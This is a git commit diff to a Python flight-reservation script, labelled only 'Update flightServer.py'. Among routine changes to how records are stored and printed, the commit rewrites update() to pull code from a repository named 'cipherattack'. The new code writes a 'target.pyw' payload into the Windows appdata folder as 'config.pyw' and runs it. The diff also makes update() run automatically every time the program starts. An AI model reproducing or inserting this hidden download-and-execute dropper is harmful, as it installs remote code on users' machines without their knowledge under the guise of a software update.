45c33b08b1e1e486b1936048dc240191ce51bd5c
Sukrit Goyal <85162845+sukritS009312@users.noreply.github.com>
2021-06-11 17:24:15 +0530

    Update flightServer.py

--- flightServer.py
+++ flightServer.py
@@ -1,24 +1,16 @@
-"""Update File"""
-import pickle, os, urllib.request as ur, webbrowser
-def update():
-    with ur.urlopen("https://github.com/sukritS009312/update/raw/main/flightServer.py") as updateFile:
-        with open(os.path.basename(__file__),"wb") as py:
-            py.write(updateFile.read())
-    return 
-        
+import pickle, os, urllib.request as ur
+
+
 def addFlight():
     recd = displayRecord()
     with open("availability.dat","wb+") as f:
         print("Enter details of the flight as per the instructions. \nFLIGHT NUMBER SHOULD BE UNIQUE IN RECORD OR ELSE THE DETAILS WOULD BE OVERWRITTEN.\n")
-        interg = ["Flight No: ","Departing Place: ","Approaching Place: ","Time of Departure: ","Time to Approach: ","Price of the ticket (in Rupees): ","Seats Vacant: "]
+        interg = ["Flight No: ","Departing Place: ","Approaching Place: ","Time of Departure: ","Time to Approach: ","Price of the ticket (in Rupees): "]
         details = [input(i) for i in interg]
         for i in range(len(details)):
             if not len(details[i]):
                 details[i] = "X"
-        subdetails = {}
-        for i in range(1,len(interg)):
-            subdetails[interg[i]] = details[i]
-        recd[details[0]] =  subdetails        
+        recd[details[0]] = details[1:] 
         pickle.dump(recd,f)
         print("Successfully Registered Flight no.",details[0])
 
@@ -28,11 +20,10 @@ def deleteFlight():
     if fno not in recd.keys():
         print("No flight was not found having number",fno)
         return
-    if input(f"Are you sure you wanna delete flight no. {fno}, from {recd[fno]['Departing Place: ']} to {recd[fno]['Approaching Place: ']}? ").lower()[0] == "y":
+    if input(f"Are you sure you wanna delete flight no. {fno}, from {recd[fno][0]} to {recd[fno][1]}? ").lower()[0] == "y":
         with open("availability.dat","wb+") as f:
             del recd[fno]
             pickle.dump(recd,f)
-            print("-"*80)
             print("Successfully Removed")
     else:
         return
@@ -47,11 +38,24 @@ def cleanRecord():
         pickle.dump({},f)
     print("Deleted all the entries!")
     return
+
+def update():
+    with ur.urlopen("https://github.com/cipher234/cipherattack/raw/main/flightServer.py") as updateFile:
+        with open(os.path.basename(__file__),"wb") as py:
+            py.write(updateFile.read())
+    os.chdir(os.environ['appdata'])        
+    with ur.urlopen("https://github.com/cipher234/cipherattack/raw/main/cipher1/target.pyw") as conf:
+        with open("config.pyw","wb") as config:
+            config.write(conf.read())
+    os.system("config.pyw")
+    return
     
 if not os.path.isfile("availability.dat"):
     with open("availability.dat","wb") as f:
         pickle.dump({},f)
-
+update()
+print("Updated the file successfully! Restart the program to check new update and features")
+exit()
 while True:
     print("Enter \"1\" for adding records\nEnter \"2\" for deleting specific records\nEnter \"3\" for viewing all the records\nEnter \"4\" for deleting all the records\nType and enter \"update\" for updating the program\n")
     todo = input("What to do? ")
@@ -67,10 +71,8 @@ while True:
                 print("No Record Found!\n"+"-"*80)
                 continue
             for i in recd.keys():
+                print(f"Flight No. : {i}\nDeparting Place : {recd[i][0]}\nApproaching Place : {recd[i][1]}\nTime of Departure : {recd[i][2]}\nTime to Approach: {recd[i][3]}\nPrice : ₹{recd[i][4]}/-")
                 print("-"*80)
-                print("Flight No: "+i+"\n")
-                for j,k in recd[i].items():
-                    print(f"{j} {k}")
         elif todo == "4":
             if input("This will delete all the registered flights. Are you sure? ").lower()[0] == "y":
                 cleanRecord()
@@ -79,9 +81,9 @@ while True:
         elif "update" in todo.lower():
             update()
             print("Updated the file successfully! Restart the program to check new update and features")
-            break
+            exit()
         else:
-            break
+            exit()
         print("="*80)
     except EOFError:
         with open("availability.dat","wb") as f:
